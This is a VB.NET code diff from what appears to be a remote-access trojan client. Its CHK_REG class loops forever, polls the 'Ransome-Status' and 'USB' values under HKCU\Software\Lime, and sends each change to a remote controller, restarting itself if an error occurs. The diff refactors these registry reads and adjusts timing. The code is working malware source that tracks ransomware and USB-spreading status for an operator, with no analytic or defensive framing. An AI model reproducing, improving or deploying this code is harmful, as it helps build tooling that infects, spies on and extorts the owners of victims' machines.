@@ -5,33 +5,31 @@ Public Class CHK_REG
     Private Shared C = Main.C
 
     Public Shared Sub Checking()
-        Thread.CurrentThread.Sleep(5000)
-        Dim Old2 As String = ID.USBSP
-        Dim Old As String = ID.Ransomeware
+        Thread.CurrentThread.Sleep(3500)
+        Dim Old As String = GTV("Ransome-Status")
+        Dim Old2 As String = GTV("USB")
+
 1:
         Try
 
-            While True 'Infinity loop
+            While True
+                Thread.CurrentThread.Sleep(3000)
 
                 'Compare old string with new string
                 'The client will old use send function IF the string has been changed
 
-                Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing)
-                If Old <> readValue.ToString Then
-                    Old = readValue
-                    C.Send("!R" & SPL & readValue.ToString)
+                If Old <> GTV("Ransome-Status").ToString Then
+                    Old = GTV("Ransome-Status")
+                    C.Send("!R" & SPL & GTV("Ransome-Status").ToString)
                 End If
 
                 If Settings.USB Then
-                    Dim readValue2 = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "USB", Nothing)
-                    If Old2 <> readValue2.ToString Then
-                        Old2 = readValue2
-                        C.Send("!U" & SPL & readValue2.ToString)
+                    If Old2 <> GTV("USB").ToString Then
+                        Old2 = GTV("USB")
+                        C.Send("!U" & SPL & GTV("USB").ToString)
                     End If
                 End If
 
-
-                Thread.CurrentThread.Sleep(3000) 'sleep to reduce cpu usage
             End While
         Catch ex As Exception
             GoTo 1
